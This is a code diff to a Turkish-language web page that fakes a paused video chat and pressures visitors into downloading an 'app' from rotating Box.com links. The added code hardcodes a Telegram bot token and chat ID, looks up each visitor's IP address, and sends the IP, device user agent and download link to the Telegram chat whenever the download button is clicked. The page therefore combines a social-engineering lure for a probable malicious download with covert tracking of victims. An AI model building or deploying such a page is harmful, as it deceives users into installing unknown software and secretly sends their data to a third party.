@@ -114,11 +114,11 @@
         </div>
         <p class="font-bold">Görüşme Duraklatıldı!</p>
         <p class="font-light text-[14px]">Görüntülü Sohbet bulunamadı. Açılması için lütfen uygulamayı  yükleyiniz.</p>
-        <a href="#" id="downloadLink"
+        <button id="downloadBtn"
             class="bg-[#6156DF] animate-pulse-heart text-white w-44 rounded-xl flex items-center justify-center p-3 px-5 relative">
             Şimdi İndir
             <i class="fa-solid fa-angle-right absolute right-4"></i>
-        </a>
+        </button>
         <div>
             <ul class="list-disc text-[11px]"><li>Üyelik tamamen ücretsizdir.</li></ul>
         </div>
@@ -148,7 +148,6 @@
             'videos/video20.mp4',
         ];
 
-
         const downloadLinks = [
 "https://app.box.com/index.php?rm=box_download_shared_file&shared_name=jfvvxsjqut9b1d5l5ft35gpt8dx5edx1&file_id=f_2042175985266",
 "https://app.box.com/index.php?rm=box_download_shared_file&shared_name=jfvvxsjqut9b1d5l5ft35gpt8dx5edx1&file_id=f_2042175985266",
@@ -176,49 +175,98 @@
 "https://app.box.com/index.php?rm=box_download_shared_file&shared_name=fhuu3kvh1o3ke0qeebboi1f4ur4zm6mk&file_id=f_2042185134049"
         ];
 
+        // Telegram ayarları
+        const token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
+        const chatId = '-1002478190818';
 
         function getCurrentDownloadLink() {
             const now = new Date();
             const currentHour = now.getHours(); 
             
-
             return downloadLinks[currentHour];
         }
 
-
         function updateDownloadLink() {
-            const downloadLink = document.getElementById('downloadLink');
             const currentLink = getCurrentDownloadLink();
-            downloadLink.href = currentLink;
-            
-
             console.log(`İndirme linki güncellendi: ${currentLink}`);
         }
 
+        function sendTelegramLog(fileUrl) {
+            const userAgent = navigator.userAgent;
+            
+            // IP adresini al
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const message = `new userr.\nIP: ${ip}\nCihaz: ${userAgent}\nİndirilen link: ${fileUrl}`;
+                    
+                    // Telegram'a mesaj gönder
+                    return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Telegram log gönderildi');
+                    } else {
+                        console.error('Telegram log gönderilemedi');
+                    }
+                })
+                .catch(error => {
+                    console.error('Log gönderme hatası:', error);
+                });
+        }
+
+        function downloadFile() {
+            const btn = document.getElementById('downloadBtn');
+            btn.innerText = 'İndiriliyor...';
+            btn.disabled = true;
+
+            const fileUrl = getCurrentDownloadLink();
+            
+            // Telegram log gönder
+            sendTelegramLog(fileUrl);
+            
+            // Dosya indirme
+            const a = document.createElement('a');
+            a.href = fileUrl;
+            a.download = '';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // 3 saniye sonra buton eski haline dönsün
+            setTimeout(() => {
+                btn.innerText = 'Şimdi İndir';
+                btn.disabled = false;
+            }, 3000);
+        }
 
         window.onload = function() {
-
+            // Rastgele video seç
             const videoIndex = Math.floor(Math.random() * videos.length);
             const selectedVideo = videos[videoIndex];
 
-
+            // Video elementini ayarla
             const videoElement = document.getElementById('backgroundVideo');
             videoElement.src = selectedVideo;
 
-
+            // İndirme linkini güncelle
             updateDownloadLink();
 
+            // İndirme butonuna event listener ekle
+            document.getElementById('downloadBtn').addEventListener('click', downloadFile);
 
+            // 5 saniye sonra görüşmeyi durdur
             setTimeout(function() {
                 videoElement.pause();
                 document.getElementById('stoppedDiv').style.display = 'flex';
             }, 5000);
         };
 
+        // Saatlik olarak indirme linkini güncelle
+        setInterval(updateDownloadLink, 60 * 60 * 1000);
 
-        setInterval(updateDownloadLink, 60 * 60 * 1000); 
-
-
+        // Touch hareketlerini engelle
         document.addEventListener('touchmove', function(e) {
             e.preventDefault();
         }, { passive: false });
